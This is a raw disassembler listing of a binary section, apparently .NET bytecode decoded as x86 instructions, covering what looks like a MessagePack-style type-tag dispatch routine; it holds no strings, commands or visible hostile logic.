  404c40:	02 00                	add    (%eax),%al
  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 dc             	add    %dh,-0x24(%edx)
  404e78:	27                   	daa
  404e79:	00 70 73             	add    %dh,0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 08             	add    %dh,0x8(%edx)
  404f7d:	28 00                	sub    %al,(%eax)
  404f7f:	70 73                	jo     0x404ff4
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
